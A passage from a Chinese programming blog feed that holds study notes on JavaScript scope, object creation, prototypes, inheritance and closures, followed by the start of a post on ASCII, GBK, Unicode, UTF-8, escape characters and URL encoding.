复制后，两个变量实际上将引用同一个对象。因此，改变其中一个变量，就会影响另一个变量。</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2019/02/26/《Javascript高级程序设计》/2.png" style="max-width:400px"></p><p><br></p><h4 id="4-2-执行环境与作用域"><a href="#4-2-执行环境与作用域" class="headerlink" title="4.2 执行环境与作用域"></a>4.2 执行环境与作用域</h4><p>执行环境定义了变量或函数有权访问的数据。每个执行环境都有一个与之关联的<em>变量对象</em>，环境中定义的所有变量和函数都保存在这个对象中。虽然我们编写的代码无法访问这个对象，但解析器在处理数据时会在后台使用它。</p><ul><li><p>全局执行环境<br>在Web浏览器中，全局执行环境被认为是<code>window</code>对象。</p></li><li><p>函数的执行环境<br>每个函数都有自己的<em>执行环境</em>。当执行流进入一个函数时，函数的环境就会被推入一个环境栈中。在函数执行之后，栈将其环境弹出，把控制权返回给之前的执行环境。</p></li></ul><p>当代码在一个环境中执行时，会创建变量对象的一个<em>作用域链</em>。作用域链的用途，是保证对执行环境有权访问的所有变量和函数的有序访问。内部环境可以通过作用域链访问所有的外部环境，但外部环境不能访问内部环境中的变量和函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var color = &quot;blue&quot;;</span><br><span class="line">function changeColor()&#123;</span><br><span class="line">    var anotherColor = &quot;red&quot;;</span><br><span class="line">    function swapColors()&#123;</span><br><span class="line">        var tempColor = anotherColor;</span><br><span class="line">        anotherColor = color;</span><br><span class="line">        color = tempColor;</span><br><span class="line">        // 这里可以访问color、anotherColor和tempColor </span><br><span class="line">    &#125;</span><br><span class="line">    // 这里可以访问color和anotherColor，但不能访问tempColor</span><br><span class="line">    swapColors();</span><br><span class="line">&#125;</span><br><span class="line">// 这里只能访问color changeColor();</span><br></pre></td></tr></table></figure></p><p><br><br><em>没有块级作用域</em><br>在其他类C的语言中，由<code>{}</code>封闭的代码块都有自己的作用域。但在JS中，<code>if</code>语句中的变量生命会将变量添加到当前的执行环境中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (true)&#123;</span><br><span class="line">  var color = &quot;blue&quot;;</span><br><span class="line">&#125;</span><br><span class="line">alert(color);  // &quot;blue&quot;</span><br></pre></td></tr></table></figure></p><p>由for语句创建的变量i即使在for循环执行结束后，也依旧会存在于循环外部的执行环境汇总。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for(var i = 0; i &lt; 10; i++)&#123;</span><br><span class="line">  doSomething(i);</span><br><span class="line">&#125;</span><br><span class="line">alert(i);  // 10</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="6-创建对象"><a href="#6-创建对象" class="headerlink" title="6. 创建对象"></a>6. 创建对象</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> book = &#123;</span><br><span class="line">  year: <span class="number">2004</span>,</span><br><span class="line">  edition: <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">Object</span>.defineProperty(book, <span class="string">'year'</span>, &#123;</span><br><span class="line">  configurable: <span class="literal">false</span>,  <span class="comment">// 不能从对象中删除属性</span></span><br><span class="line">  enumerable: <span class="literal">true</span>,     <span class="comment">// 可以通过for-in循环返回属性</span></span><br><span class="line">  writable: <span class="literal">false</span>,      <span class="comment">// 只读不可修改</span></span><br><span class="line">  value: <span class="string">'Nicholas'</span>,</span><br><span class="line">  get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.year;   <span class="comment">// 当js中读取到year这一属性，就会触发getter函数</span></span><br><span class="line">  &#125;,</span><br><span class="line">  set: functtion(newValue)&#123;</span><br><span class="line">    <span class="comment">// 当js执行year = newValue; 就会触发setter函数。除了修改值，还可以做一些其他操作</span></span><br><span class="line">    <span class="keyword">if</span> (newValue &gt; <span class="number">2004</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.year = newValue;   </span><br><span class="line">      <span class="keyword">this</span>.edition += newValue - <span class="number">2004</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取属性的值</span></span><br><span class="line"><span class="keyword">var</span> descriptor = <span class="built_in">Object</span>.getOwnPropertyDescriptor(book, <span class="string">'year'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(year.value);        <span class="comment">// 2004</span></span><br><span class="line"><span class="built_in">console</span>.log(year.configurable); <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p><br></p><h4 id="6-1-构造函数"><a href="#6-1-构造函数" class="headerlink" title="6.1 构造函数"></a>6.1 构造函数</h4><p><code>new</code>一个新实例会经历以下4个步骤: 创建一个新对象；将构造函数的作用域赋给新对象(this指向这个新对象); 执行构造函数中的代码(为这个新对象添加属性); 返回新对象。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age, job</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.job = job;</span><br><span class="line">  <span class="keyword">this</span>.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person(<span class="string">'Greg'</span>, <span class="number">27</span>, <span class="string">'Doctor'</span>);</span><br><span class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person(<span class="string">'Nicholas'</span>, <span class="number">29</span>, <span class="string">'Software Enginner'</span>);</span><br></pre></td></tr></table></figure></p><p>person1和person2分别保存着Person的不同实例。这两个对象都有一个constructor构造函数属性，该属性指向Person。</p><p>使用<code>call()</code>或<code>apply()</code>在某个特殊对象的作用域中调用<code>Person()</code>函数。这里是在对象o的作用域中调用，因此调用后o就拥有了所有属性和sayName()方法。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o = <span class="keyword">new</span> <span class="built_in">Object</span>();</span><br><span class="line">Person.call(o, <span class="string">'Kristen'</span>, <span class="number">25</span>, <span class="string">'Nurse'</span>);</span><br><span class="line">o.sayName();   <span class="comment">// "Kristen"</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-2-原型模式"><a href="#6-2-原型模式" class="headerlink" title="6.2 原型模式"></a>6.2 原型模式</h4><p>每个函数都有一个prototype属性，这个属性是一个指针，指向一个对象。原型对象的好处是可以让所有对象实例共享它所包含的属性和方法。换句话说，不必在构造函数中定义对象实例的信息，而是可以将这些信息直接添加到原型对象中。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">Person.prototype.name = <span class="string">'Nicholas'</span>;</span><br><span class="line">Person.prototype.sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person();</span><br><span class="line">person.sayName(); <span class="comment">// "Nicholas"</span></span><br></pre></td></tr></table></figure></p><p><img src="/2019/02/26/《Javascript高级程序设计》/3.png" style="max-width:500px"></p><p><br></p><ul><li><p>hasOwnProperty()<br>检测一个属性是存在于实例中，还是存在于原型中。</p></li><li><p>in操作符</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(person1.hasOwnProperty(<span class="string">"name"</span>));   <span class="comment">// false</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"name"</span> <span class="keyword">in</span> person1);                <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p>更简洁的写法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">  <span class="keyword">constructor</span> : Person,</span><br><span class="line">  name: 'Nicholas',</span><br><span class="line">  sayName: function()&#123;</span><br><span class="line">    alert(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>原型对象的问题<br>由于name存在于Person.prototype而非person1中，当person1.name被修改时，这个修改也会通过person2.name反映出来。因此我们很少单独使用原型模式。</p></li></ul><p><br></p><h4 id="6-3-组合使用构造函数模式和原型模式"><a href="#6-3-组合使用构造函数模式和原型模式" class="headerlink" title="6.3 组合使用构造函数模式和原型模式"></a>6.3 组合使用构造函数模式和原型模式</h4><p>构造函数模式用于定义实例属性，而原型模式用于定义方法和共享的属性。结果，每个实例都有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度地节省了内存。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age, job</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">  <span class="keyword">this</span>.job = job;</span><br><span class="line">  <span class="keyword">this</span>.friends = [<span class="string">'Amy'</span>, <span class="string">'Mike'</span>];</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">  <span class="keyword">constructor</span>: Person,</span><br><span class="line">  sayName: function()&#123;</span><br><span class="line">    alert(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-4-寄生模式"><a href="#6-4-寄生模式" class="headerlink" title="6.4 寄生模式"></a>6.4 寄生模式</h4><p>当我们想创建一个具有额外方法的特殊数组，由于不能直接修改Array构造函数，因此可以用这个模式。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SpecialArray</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> values = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">  <span class="comment">// 添加值</span></span><br><span class="line">  values.push.apply(values, <span class="built_in">arguments</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 添加方法</span></span><br><span class="line">  values.toPiedString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.join(<span class="string">"|"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> values;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> colors = <span class="keyword">new</span> SpecialArray(<span class="string">"red"</span>, <span class="string">"blue"</span>, <span class="string">"green"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(colors.toPipedString());  <span class="comment">// "red|blue|green"</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="7-继承"><a href="#7-继承" class="headerlink" title="7. 继承"></a>7. 继承</h3><h4 id="7-1-原型链"><a href="#7-1-原型链" class="headerlink" title="7.1 原型链"></a>7.1 原型链</h4><p>让原型对象等于另一个类的实例。创建SuperType的实例，并将实例赋值给SubType.prototype。本质是重写原型对象。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SuperType实例中的所有属性和方法，现在存在于SubType.prototype中。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SuperType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.value = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SuperType.prototype.getSuperValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SubType</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.subValue = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">SubType.prototype = <span class="keyword">new</span> SuperType();</span><br><span class="line">SubType.prototype.getSubValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.subValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> instance = <span class="keyword">new</span> SubType();</span><br><span class="line"><span class="built_in">console</span>.log(instance.getSuperValue); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p>略</p><p><br></p><h3 id="8-函数表达式"><a href="#8-函数表达式" class="headerlink" title="8. 函数表达式"></a>8. 函数表达式</h3><p>定义函数的方式有两种<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">functionName</span>(<span class="params">args</span>)</span>&#123;&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数表达式</span></span><br><span class="line"><span class="keyword">var</span> functionName = <span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="8-1-闭包"><a href="#8-1-闭包" class="headerlink" title="8.1 闭包"></a>8.1 闭包</h4><p><em>闭包</em>是指有权访问另一个函数作用域中的变量的函数。</p><p>创建闭包的常见方式，就是在一个函数内部创建另一个函数。</p><p><code>var value1=</code>这两行代码是内部函数（一个匿名函数）的代码，这两行代码访问了外部函数中的变量propertyName。即使这个内部函数被返回了，它仍然可以访问变量propertyName，之所以还能访问这个变量，是因为内部函数的作用域链中包含<code>createComparisonFunction()</code>的作用域。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createComparisonFunction</span>(<span class="params">propertyName</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params">object1, object2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> value1 = object1(propertyName);</span><br><span class="line">    <span class="keyword">var</span> value2 = object2(propertyName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (value &lt; value2)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>字符集和字符编码 Charset &amp; Encoding</title>
      <link href="/2019/02/16/ASCII%EF%BC%8CUnicode%E5%92%8CUTF-8/"/>
      <url>/2019/02/16/ASCII%EF%BC%8CUnicode%E5%92%8CUTF-8/</url>
      <content type="html"><![CDATA[<p>一直听说<code>ASCII</code>, <code>Unicode</code>, <code>UTF-8</code>这些词，但是不知道具体意思。痛定思痛，决定总结一下。<br><br></p><h3 id="1-历史渊源"><a href="#1-历史渊源" class="headerlink" title="1. 历史渊源"></a>1. 历史渊源</h3><h4 id="1-1-ASCII码"><a href="#1-1-ASCII码" class="headerlink" title="1.1 ASCII码"></a>1.1 ASCII码</h4><p>我们知道，在计算机内部，所有的信息最终都表示为一个二进制的字符串。每一个二进制位(bit)有0和1两种状态，因此8个二进制位可以组合出<code>256</code>中状态，这被称为一个字节(byte)。</p><p>上世纪60年代，美国制定了一套字符编码，对英语字符与二进制之间的关系，做了统一规定。这被称为<code>ASCII码(American Standard Code for Information Interchange)</code>，一直沿用至今。ASCII码一共规定了128个字符的编码。比如空格是32(二进制00100000)，大写的字母A是65(二进制01000001)。这128个符号，只占用了一个字节的后面7位，最前面的1位统一规定为0。<br><br></p><h4 id="1-2-GBK"><a href="#1-2-GBK" class="headerlink" title="1.2 GBK"></a>1.2 GBK</h4><p>后来，世界各地都开始使用计算机，但是很多国家用的不是英文，他们的字母里有很多是<code>ASCII</code>里没有的。等到中国人民用计算机之后，发现没有中文怎么办呢？</p><p>中国人的解决方案是：小于127号的还是继续使用，并且用2个大于127字节表示一个中文字符。在这些编码里，我们还把数学符号、罗马希腊的字母、日本的假名们都编进去了，连在ASCII里本来就有的数字、标点、字母都统统重新编了两个字节长的编码，这就是常说的 <em>全角</em> 字符，而原来在127号以下的那些就叫 <em>半角</em> 字符了。</p><p>这套编码方案被称为<code>GBK</code>标准。中国的程序员看到这一系列汉字编码的标准是好的，于是把它通称为<code>DBCS</code>(Double Byte Charecter Set 双字节字符集)。<br><br></p><h4 id="1-3-Unicode"><a href="#1-3-Unicode" class="headerlink" title="1.3 Unicode"></a>1.3 Unicode</h4><p>但是每个国家都搞自己的字符编码，自己只能看自己，别人的看不来，这不符合web开放的文化啊。</p><p>正在这时一个叫ISO（国际标准化组织）的国际组织决定解决这个问题。他们采用的方法很简单：废了所有地区性编码方案，重新搞了一个包括了地球上所有文化、所有字母和符号的编码！他们打算叫它”Universal Multiple-Octet Coded Character Set”，简称UCS, 俗称<code>Unicode</code>。</p><p><code>Unicode</code>开始制定时，计算机的存储器容量极大地发展了，空间不再成为问题。于是ISO就直接规定必须用<strong>两个字节</strong>， 16位来统一表示所有的字符，对于ASCII里那些“半角字符”， 也将其长度由原来的8位扩展至16位。这种大气的方案使得保存英文文本时会浪费多一倍的空间。</p><p><br></p><h4 id="1-4-UFT-8"><a href="#1-4-UFT-8" class="headerlink" title="1.4 UFT-8"></a>1.4 UFT-8</h4><p><strong>Unicode有两个严重的问题</strong>: 1. 怎样区别Unicode和ASCII？计算机怎么知道2个字节为1个字符，还是1个字节为1个字符。2. 计算机大部分内容还是英文，Unicode的编码方式很浪费空间。</p><p>Unicode在很长一段时间内无法推广。直到互联网的出现，强烈要求出现统一的编码方式。<code>UTF-8</code>就是互联网上使用最广的一种Unicode的实现方式。UTF-8最大的一个特点，就是它是一种<em>变长的编码方式</em>。它可以使用1~4个字节表示一个符号。UTF-8的编码规则很简单，只有两条：</p><ul><li><p>对于单字节的符号，字节的第一位设为0，后面7位为这个符号的unicode码。因此对于英文字母，UTF-8编码和ASCII码是相同的。</p></li><li><p>对于n字节的符号(n &gt; 1)， 第一个字节的前n位都设为1， 第n+1位设为0，后面字节的前两位一律设为10.剩下的没有提及的二进制位，全部为这个符号的unicode码。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Unicode符号范围       | UTF-8编码方式</span><br><span class="line">(十六进制)            | 二进制</span><br><span class="line">0000 0000-0000 007F | 0xxxxxxx</span><br><span class="line">0000 0080-0000 07FF | 110xxxxx 10xxxxxx</span><br><span class="line">0000 0800-0000 FFFF | 1110xxxx 10xxxxxx 10xxxxxx</span><br><span class="line">0001 0000-0010 FFFF | 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</span><br></pre></td></tr></table></figure><p><br></p><h4 id="1-5-Charset-and-Encoding"><a href="#1-5-Charset-and-Encoding" class="headerlink" title="1.5. Charset and Encoding"></a>1.5. Charset and Encoding</h4><p>所以, 字符集和字符编码，你可以这样理解</p><ul><li><p><em><code>Charset(Character set) 字符集</code></em><br>是对字符抽象表示的集合。包括世界上各种文字、符号。</p></li><li><p><em><code>Encoding(Character Encoding) 字符编码</code></em><br>建立字符集合和计算机系统对应的规则。简单来说就是，将字符转化为计算机可识别的二进制编码的规则。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=Content-Type content=&quot;text/html;charset=utf-8&quot;&gt;</span><br></pre></td></tr></table></figure><p><br> </p><h3 id="2-乱码"><a href="#2-乱码" class="headerlink" title="2. 乱码"></a>2. 乱码</h3><p>编码A和编码B采用不同方式来编码，当一个文件使用编码A在只有编码B的设备上解码，就会出现乱码。</p><p><br></p><h3 id="3-转义字符"><a href="#3-转义字符" class="headerlink" title="3. 转义字符"></a>3. 转义字符</h3><p>所有编程语言，都拥有转义字符。</p><p><em>出现转义字符的原因</em></p><ul><li>使用转义字符来表示没有现成文字代号的字符，如回车，换行，ASCII里的控制字符。</li><li>一些特定的字符在语言中被定义为特殊用途，失去了原来的意义。</li></ul><p><em>转义字符的作用</em></p><ul><li>用于表示不能直接显示的字符</li><li>将有特殊意义的字符转换回它原来的意义</li><li>处于网站安全，在数据写入数据库前，都会使用转义字符对一些敏感字符转义</li></ul><p><br></p><h4 id="3-1-C"><a href="#3-1-C" class="headerlink" title="3.1 C"></a>3.1 C</h4><p>所有ASCII码都可以用<code>\</code>加8进制数字来表示。C中定义了一些字母前加<code>\</code>来表示常见的，不能显示的ASCII字符，成为转义字符。</p><table><thead><tr><th>转义字符</th><th style="text-align:center">意义</th><th style="text-align:right">ASCII码值(十进制)</th></tr></thead><tbody><tr><td>\a</td><td style="text-align:center">响铃</td><td style="text-align:right">007</td></tr><tr><td>\b</td><td style="text-align:center">退格</td><td style="text-align:right">008</td></tr><tr><td>\f</td><td style="text-align:center">换页</td><td style="text-align:right">012</td></tr><tr><td>\n</td><td style="text-align:center">换行</td><td style="text-align:right">010</td></tr><tr><td>\r</td><td style="text-align:center">回车</td><td style="text-align:right">013</td></tr><tr><td>\t</td><td style="text-align:center">水平制表（跳到下一个tab）位置</td><td style="text-align:right">009</td></tr><tr><td>\v</td><td style="text-align:center">垂直制表</td><td style="text-align:right">011</td></tr><tr><td><code>\\</code></td><td style="text-align:center">代表一个反斜线字符<code>\</code></td><td style="text-align:right">092</td></tr><tr><td>\’</td><td style="text-align:center">代表一个单引号</td><td style="text-align:right">039</td></tr><tr><td>\”</td><td style="text-align:center">代表一个双引号字符</td><td style="text-align:right">034</td></tr><tr><td>\?</td><td style="text-align:center">代表一个问号</td><td style="text-align:right">063</td></tr><tr><td>\0</td><td style="text-align:center">空字符()</td><td style="text-align:right">000</td></tr><tr><td>\ddd</td><td style="text-align:center">1到3位八进制数所代表的任意字符</td><td style="text-align:right">三位八进制</td></tr><tr><td>\xhh</td><td style="text-align:center">1到2位十六进制所代表的任意字符</td><td style="text-align:right">二位十六进制</td></tr></tbody></table><p><br></p><h4 id="3-1-html"><a href="#3-1-html" class="headerlink" title="3.1 html"></a>3.1 html</h4><p>HTML中<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>等有特殊含义(&lt;&gt;用于标签符，&amp;用于转义)，常用</p><table><thead><tr><th>显示</th><th style="text-align:center">说明</th><th style="text-align:center">实体名称</th></tr></thead><tbody><tr><td>&lt;</td><td style="text-align:center">小于</td><td style="text-align:center"><code>&amp;lt;</code></td></tr><tr><td><code>&gt;</code></td><td style="text-align:center">大于</td><td style="text-align:center"><code>&amp;gt;</code></td></tr><tr><td>&amp;</td><td style="text-align:center">&amp;符号</td><td style="text-align:center"><code>&amp;amp;</code></td></tr><tr><td>“</td><td style="text-align:center">双引号</td><td style="text-align:center"><code>&amp;quot;</code></td></tr><tr><td></td><td style="text-align:center">不断行的空白格</td><td style="text-align:center"><code>&amp;nbsp;</code></td></tr></tbody></table><p><br></p><h4 id="3-2-js"><a href="#3-2-js" class="headerlink" title="3.2 js"></a>3.2 js</h4><p><code>\</code>反斜杠用来在文本字符串中插入特殊字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var txt = &quot;We are the so-called \&quot;Vikings\&quot; from the north.&quot;</span><br></pre></td></tr></table></figure></p><table><thead><tr><th>代码</th><th style="text-align:center">输出</th></tr></thead><tbody><tr><td>\’</td><td style="text-align:center">单引号</td></tr><tr><td>\”</td><td style="text-align:center">双引号</td></tr><tr><td>\&amp;</td><td style="text-align:center">和号</td></tr><tr><td><code>\\</code></td><td style="text-align:center">反斜杠</td></tr><tr><td>\n</td><td style="text-align:center">换行符</td></tr><tr><td>\r</td><td style="text-align:center">回车符</td></tr></tbody></table><p><br></p><h3 id="4-URL编码函数"><a href="#4-URL编码函数" class="headerlink" title="4. URL编码函数"></a>4. URL编码函数</h3><p>世界上有英文字母的网址<code>“http://www.baidu.com”</code>,但是没有希腊字母的网址<code>“http://www.aβγ.com”</code>。这是因为网络标准RFC 1738做了硬性规定：</p><blockquote><p>“…Only alphanumerics [0-9a-zA-Z], the special characters “$-_.+!*’(),” [not including the quotes - ed], and reserved characters used for their reserved purposes may be used unencoded within a URL.”</p></blockquote><p>只有字母和数字[0-9a-zA-Z],一些特殊符号<code>$-_.+!*&#39;(),</code>(不包括双引号),以及某些保留字，才可以不经过编码直接用于URL。这意味着，如果URL中有汉字，就必须编码后使用。但麻烦的是，RFC1738没有规定具体的编码方法，于是有了编码函数。</p><p><br></p><h4 id="4-1-浏览器编码"><a href="#4-1-浏览器编码" class="headerlink" title="4.1 浏览器编码"></a>4.1 浏览器编码</h4><p>当网址路径中包含汉字，<code>GET</code>和<code>POST</code>查询字符串中包含汉字时<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.haoroom.con/search?keywords=您好</span><br></pre></td></tr></table></figure></p><p>编码方法由网页的编码决定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=xxxx&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="4-2-escape"><a href="#4-2-escape" class="headerlink" title="4.2 escape"></a>4.2 escape</h4><p><code>escape()</code>已被弃用，它的作用是返回字符的Unicode编码值。对应的解码函数是<code>unescape</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 